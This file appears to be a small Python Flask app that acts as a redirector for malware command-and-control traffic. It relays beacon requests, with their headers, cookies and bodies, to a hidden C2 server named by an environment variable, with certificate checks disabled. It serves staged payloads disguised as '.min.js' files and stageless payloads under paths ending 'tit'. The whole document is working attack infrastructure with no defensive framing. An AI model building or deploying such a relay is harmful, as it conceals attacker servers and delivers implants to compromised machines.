from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/', methods=['POST','GET'])
def example():
    return 'ok'

@app.route('/api/<path:path>', methods=['POST','GET'])
def main_handler(path):
    C2 = 'https://' + os.getenv('C2') # HTTPS Beacon

    ori_headers = {}
    for key, value in request.headers.items():
        if key not in ['Host', 'Content-Length']:
            ori_headers[key] = value

    try:
        req = requests.request(
            method = request.method,
            url = C2 + '/api/' +path,
            headers = ori_headers,
            data = request.get_data(),
            cookies = request.cookies,
            verify=False,
            allow_redirects=False
            )

        rsp_headers = {}
        for key, value in req.headers.items():
            if key not in ['Date', 'Connection', 'Server']:
                rsp_headers[key] = value

        if path.endswith(".min.js"): # staging
            rsp_headers['Content-Type'] = 'application/octet-stream'
            return req.content, req.status_code, rsp_headers.items()
        elif path.endswith("tit"): # stagless
            return req.text, req.status_code, rsp_headers.items()
        else: # other
            return 'request err'
    except:
        return 'request err'
